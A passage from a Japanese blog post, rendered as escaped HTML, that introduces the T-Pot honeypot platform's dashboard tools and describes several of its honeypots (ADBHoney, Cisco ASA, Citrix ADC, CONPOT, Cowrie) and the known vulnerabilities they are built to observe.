    style=&quot;padding-bottom: 121.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAYCAYAAAD6S912AAAACXBIWXMAARlAAAEZQAGA43XUAAACjUlEQVQ4y5WU2W7bMBBF9Q2NEzuWSGqzFmpxvCYI2j8o0JcUSIEUQR/6/59wO0OKNh1HqfNwQdmmjufOFmz2X/Hy+hdPz7/x/PIH33884enXK34+vyCMFL5cTTG5vsXVZHaRgttQIVvUSLOSVCHNK2S5PafT0MCub+aYkK4HTT44g3kYYzaTmM4ikvAU4XauwL9/RoFQGWScI0kLhCLBDUXFsJtZaJ4/qyASKXyFUYKI5M4zicTelal99u7yGQiZIy9aNP0WQmbgz2OKRIY4KbHePmL38I1cVeY7qY53Av6g4hKyXEOkNaJQQkQx/WMMIbLhT6zsywtU9RK6XaOlIIqyo9wlhzsWmFSQxYqgpGpD2tLzBoJe9oEsB6yblQE23QZF1Y0AGcbnoCMwPwNW+s5AGVjT8ykw1VDNA1S9sy+z3Sg5i84A48UhMt3aKMuqPwXGBGSbivNIFfyoMCouUDV30MbyBl2/o0HQVOF0KApfomLYvHFh9KGivoQ4FoWtOuluTTnsTfVthAfgBkrvodpHCKr6MdJTy4osc87YKkdYU7T9am9OrygE1PcmOtM2o/14GiHnkaHc6HOTc9eHHCFFJ7N2gC1GcygphwfYcmdOqQqvsQfLiiKUeTdq1X3HlrmpGdQRkCPkQrk7A1DbCAvOwxjQ5bAwhWCoaZtuS2uvNraPRcm0ySFDx0Bu9BjocqfpXK7uqQ87GlUfyBFSU8vFcpjf/M2E5J5lm0NjexAv5kj4k5I5YP8G+H6EbJXVDNbd1vEsN8ayGb2ThZCfPnuWx0fPNXa9N9vm/zlcGFClV4cVxqPnFSU75jDvLiqKnRK3IM4sZ8ayyHu7VC8A8urSLffhlmClWf0uPf8AwoyhzHKvGs8AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/63bb1a26b1151916ee75c350a40556c1/8ac56/image-61.webp 240w,
/static/63bb1a26b1151916ee75c350a40556c1/d3be9/image-61.webp 480w,
/static/63bb1a26b1151916ee75c350a40556c1/19998/image-61.webp 495w&quot;
              sizes=&quot;(max-width: 495px) 100vw, 495px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/63bb1a26b1151916ee75c350a40556c1/8ff5a/image-61.png 240w,
/static/63bb1a26b1151916ee75c350a40556c1/e85cb/image-61.png 480w,
/static/63bb1a26b1151916ee75c350a40556c1/a4d88/image-61.png 495w&quot;
            sizes=&quot;(max-width: 495px) 100vw, 495px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/63bb1a26b1151916ee75c350a40556c1/a4d88/image-61.png&quot;
            alt=&quot;image-61.png&quot;
            title=&quot;image-61.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今はまだT-Potをインターネットに解放していないので何のデータも収集されていませんが、実際にハニーポットの運用を始めたらこのダッシュボードの情報を基本的に見ていく形になりそうです。&lt;/p&gt;
&lt;h3 id=&quot;security-meter&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#security-meter&quot; aria-label=&quot;security meter permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Security Meter&lt;/h3&gt;
&lt;p&gt;Security Meterは、T-Potを開発したドイツのTelekom社のセキュリティセンサーというモジュールが観測した情報を収集して可視化してくれる感じのツールみたいです。&lt;/p&gt;
&lt;p&gt;セキュリティセンサーは全世界に90以上あり、そこで収集された情報が使用されているとのことです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.telekom.com/en/media/media-information/archive/security-dashboard-shows-cyber-attacks-in-real-time-358884&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Security dashboard shows cyber attacks in real time | Deutsche Telekom&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;T-Potの環境がなくても以下のリンクからアクセスすることもできます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.sicherheitstacho.eu/start/main&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Sicherheitstacho&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;UIめちゃカッコいい…。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5b076765158fd46ca4455988a75b8496/0b533/image-60.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 71.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAAB4UlEQVQ4y41TOZLbMBAc8AJPgfdhUlqWq7R24kAuO3Gy/3/VeHokSqK8gYMugE2gp+cAEREDRVHwMAycZRkbY3jjNwTkKV75T3DdLMvCl8uFT6fTTtAIKoo5oZAj8hXhTRh78yqIy57nKZ5/eGT0cEcpf6OWYwrUoREe4gVFygGh8i8OS1dybC2HYXiPXlHCVtZaVuwhOAUpTya/iV8DZxLgXo4kSfhwOHCe5+z7vpCPdP2bm0zc5AJwv4qRL8HICx20FANlciZ4ZNf3PZ/PZ56mUWsXRFI3j3aiA+XqAq7fJf3v1PFMBR/JSUmyfQ3hbhxHrutaifffZ04P6e4Q0p5EAOk5siLa3MsySbCUwn+7vOHrxwcndbV17N6gRmq4dd0+dRf/0Bj/MVJ7weXnwrawO87oHJr/mUEmDPNRZhCpl2XJzuW6B5xzuhb4dtfvV1gb8yz30YcGZaubRoXwQvBanCsVaZoqj+5nso+iSGFltJ4RBIHew1ms9Gf9wcfhC9s4lguhPr91XbnrOu77gdu25XmeOZb/nz1JnQQZt0aM4S6tpzceZHQQDQ7Q7XGadAUQGaOFDOAGohvwunTUhK+qitumZWraRq2CRCRcRG2QKng407RvgtqkJ9HNIc4BfwGOJTE8DKNOCgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5b076765158fd46ca4455988a75b8496/8ac56/image-60.webp 240w,
/static/5b076765158fd46ca4455988a75b8496/d3be9/image-60.webp 480w,
/static/5b076765158fd46ca4455988a75b8496/b0a15/image-60.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5b076765158fd46ca4455988a75b8496/8ff5a/image-60.png 240w,
/static/5b076765158fd46ca4455988a75b8496/e85cb/image-60.png 480w,
/static/5b076765158fd46ca4455988a75b8496/0b533/image-60.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5b076765158fd46ca4455988a75b8496/0b533/image-60.png&quot;
            alt=&quot;image-60.png&quot;
            title=&quot;image-60.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&quot;spiderfoot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#spiderfoot&quot; aria-label=&quot;spiderfoot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Spiderfoot&lt;/h3&gt;
&lt;p&gt;SpiderfootはOSSのOSINTツールです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.spiderfoot.net/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Home - SpiderFoot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;インテリジェンスな情報収集を自動化できるようです。&lt;/p&gt;
&lt;p&gt;例えば、ハニーポットが収集したIPアドレスなどの情報やメールアドレス、URLなどの情報を特定の攻撃キャンペーンと紐づけるといったインテリジェンスな解析を自動化したりできそうです。&lt;/p&gt;
&lt;p&gt;こちらもまだT-Potをインターネットに解放しておらず何のデータも収集されていないため、実際に運用を始めてから試してみようと思います。&lt;/p&gt;
&lt;h3 id=&quot;t-potgithub&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#t-potgithub&quot; aria-label=&quot;t potgithub permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;T-Pot@Github&lt;/h3&gt;
&lt;p&gt;T-PotのGitHubリポジトリがリンクされています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/telekom-security/tpotce&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GitHub - telekom-security/tpotce:  T-Pot - The All In One Honeypot Platform &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ハニーポットの種類&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88%E3%81%AE%E7%A8%AE%E9%A1%9E&quot; aria-label=&quot;ハニーポットの種類 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ハニーポットの種類&lt;/h2&gt;
&lt;p&gt;かなり細かいですが、T-Potの全体像はこんな感じになっています。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/aedf85215e335d38c43f4fce3389324c/0b533/image-62.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 45.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAARlAAAEZQAGA43XUAAAB+ElEQVQozzWRWU/bUBCF+f+PlSqCioCKEF546WuFHShrNpWQpSGQBCc4tq9vvNvZUL9eO6qlozNn5szR1XhvXrri44uG9f0O86uOpfTg/jeXVY2qrqPn0HSurq/Qq1W0/7281jT06ypvWgtx0cT+0WIvDSK8uSCWAaHrEZiCVZwRuz6J45N5EakbENkLEqF0kpJFCbEXsF1viMKIT/6SrDOy9VIFrpb4QUCSpURJTBiEZKonbYFnuwTSw3ck0nLwFAdxSKD8UsoiQAYem89tEZzECXvi5zOO3sXVejiXHcR1H/dmgH3bR9wPcO8GiFulq10craPQRSi/ne/ou53YEMVjkkQFOrUhTmOIqA+xai84OVSQ2VAhrVdE47WY57XdVN76zm/lM7VrqzqdSpbr1e6F8vYFt/GGfHzFre+waI1xn8bIHO1JwflyMW/sPLle1N5wHl7IRFCcqQic/uowbvUx7ruM6z0mtS7GTYdh7ZlRo8d76w/jZo+R6o/qXSbNfuHL6+mD4scOvmGzVXfMskzd0Je8z6bYC5cPe87MMpGhr3oGxscM07aYzU0mSk9NpR2r6I+n7yyUb2RMWG035N9yqf5y5eyMcrnMQelAocT+/j7HR0ecV86pVCoFnxdcoXx6WnhKypPj8NshJ8cntJ/apGlKGIb8A1v4fgNR6wIJAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/aedf85215e335d38c43f4fce3389324c/8ac56/image-62.webp 240w,
/static/aedf85215e335d38c43f4fce3389324c/d3be9/image-62.webp 480w,
/static/aedf85215e335d38c43f4fce3389324c/b0a15/image-62.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/aedf85215e335d38c43f4fce3389324c/8ff5a/image-62.png 240w,
/static/aedf85215e335d38c43f4fce3389324c/e85cb/image-62.png 480w,
/static/aedf85215e335d38c43f4fce3389324c/0b533/image-62.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/aedf85215e335d38c43f4fce3389324c/0b533/image-62.png&quot;
            alt=&quot;image-62.png&quot;
            title=&quot;image-62.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://github.com/telekom-security/tpotce/blob/master/doc/architecture.png&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;tpotce/architecture.png at master · telekom-security/tpotce&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前述したツール群とハニーポットは、docker-composeで管理されたコンテナとしてそれぞれ起動されます。&lt;/p&gt;
&lt;p&gt;この画像には18台のハニーポットしか記載されていませんが、なんと本記事執筆時点(2022/02/14)時点でのT-Potが持つハニーポットは全部で25個のようです。&lt;/p&gt;
&lt;p&gt;すごい。&lt;/p&gt;
&lt;p&gt;せっかくなのでそれぞれがどんなハニーポットなのかざっくり見ていこうと思います。&lt;/p&gt;
&lt;h3 id=&quot;adbhoney&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#adbhoney&quot; aria-label=&quot;adbhoney permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ADBHoney&lt;/h3&gt;
&lt;p&gt;「ADBHoney」は、TCP/IPを経由した&lt;code class=&quot;language-text&quot;&gt;Android Debug Bridge（ADB）&lt;/code&gt;用のハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/huuck/ADBHoney&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;huuck/ADBHoney: Low interaction honeypot designed for Android Debug Bridge over TCP/IP&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Android Debug Bridge（ADB）&lt;/code&gt;とは、Androidデバイスとの通信を可能にするコマンドラインツールです。&lt;/p&gt;
&lt;p&gt;Androidデバイス上で稼働するデーモン(&lt;code class=&quot;language-text&quot;&gt;adbd&lt;/code&gt;)に対してADBクライアントから接続を行うことでデバッグなどを行うことができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://developer.android.com/studio/command-line/adb&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Android Debug Bridge (adb)  |  Android Developers&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通常デバイス側のADBは保護された通信でのみ行われますが、もしインターネットにADBサービスのポートが無防備に公開されている場合、そのデバイスはインターネット経由で悪意のある攻撃者による任意のコード実行を受け付けます。&lt;/p&gt;
&lt;p&gt;「ADBHoney」はこのような開放ポート&lt;code class=&quot;language-text&quot;&gt;5555&lt;/code&gt;に対してマルウェアをダウンロードさせることを目的とした攻撃をキャッチすることを目的としたハニーポットです。&lt;/p&gt;
&lt;h3 id=&quot;cisco-asa-honeypot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cisco-asa-honeypot&quot; aria-label=&quot;cisco asa honeypot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cisco ASA honeypot&lt;/h3&gt;
&lt;p&gt;「Cisco ASA honeypot」はDoSおよびRCEを引き起こす&lt;code class=&quot;language-text&quot;&gt;CVE-2018-0101&lt;/code&gt;に対する攻撃を検出できるハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/Cymmetria/ciscoasa_honeypot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Cymmetria/ciscoasa_honeypot: A low interaction honeypot for the Cisco ASA component capable of detecting CVE-2018-0101, a DoS and remote code execution vulnerability.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;CVSSv3の評価で10.0の脆弱性で、double-freeの悪用みたいです。&lt;/p&gt;
&lt;p&gt;こういう特定の脆弱性に対しての攻撃のみを収集することを目的としたハニーポットもあるんですね。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0101&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;CVE - CVE-2018-0101&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://jvndb.jvn.jp/ja/contents/2018/JVNDB-2018-001897.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;JVNDB-2018-001897 - JVN iPedia - 脆弱性対策情報データベース&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;honepot-for-cve-2019-19781-citrix-adc&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#honepot-for-cve-2019-19781-citrix-adc&quot; aria-label=&quot;honepot for cve 2019 19781 citrix adc permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Honepot for CVE-2019-19781 (Citrix ADC)&lt;/h3&gt;
&lt;p&gt;「Honepot for CVE-2019-19781 (Citrix ADC)」も同じく特定の脆弱性を対象としたハニーポットです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;CVE-2019-19781&lt;/code&gt;の悪用を目的とした攻撃をキャッチします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/MalwareTech/CitrixHoneypot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;MalwareTech/CitrixHoneypot: Detect and log CVE-2019-19781 scan and exploitation attempts.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この脆弱性も悪用によってRCEが可能になります。&lt;/p&gt;
&lt;p&gt;CVSSv3の評価で9.8であり、パストラバーサルの脆弱性です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.jpcert.or.jp/at/2020/at200003.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;複数の Citrix 製品の脆弱性 (CVE-2019-19781) に関する注意喚起&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://jvndb.jvn.jp/ja/contents/2019/JVNDB-2019-013490.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;JVNDB-2019-013490 - JVN iPedia - 脆弱性対策情報データベース&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;conpot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conpot&quot; aria-label=&quot;conpot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CONPOT&lt;/h3&gt;
&lt;p&gt;「CONPOT」は産業用施設に対する攻撃をキャッチするためのハニーポットです。&lt;/p&gt;
&lt;p&gt;一般的な産業用制御プロトコルを使用して複雑なインフラストラクチャ環境をエミュレートします。&lt;/p&gt;
&lt;p&gt;具体的にどうやってるのかはよくわからんのですが、意図的に応答を遅延させることで、一定の負荷がかかっているような環境を模倣することも可能なようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://conpot.org/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Conpot&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;cowrie&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#cowrie&quot; aria-label=&quot;cowrie permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cowrie&lt;/h3&gt;
&lt;p&gt;「Cowrie」はSSHとTelnetに対してのブルートフォース攻撃、また、システム侵入後の攻撃者のふるまいを監視できるようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/cowrie/cowrie&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;cowrie/cowrie: Cowrie SSH/Telnet Honeypot https://cowrie.readthedocs.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「Cowrie」は動作モードによってどのような振る舞いをキャッチするか変更できるようですが、T-Potのデフォルトの設定ファイルを見ると、SSHもTelnetやJSON形式のロギングなど、諸々有効化されているようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/telekom-security/tpotce/blob/master/docker/cowrie/dist/cowrie.cfg&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;tpotce/cowrie.cfg at master · telekom-security/tpotce&lt;/a&gt;&lt;/p&gt;
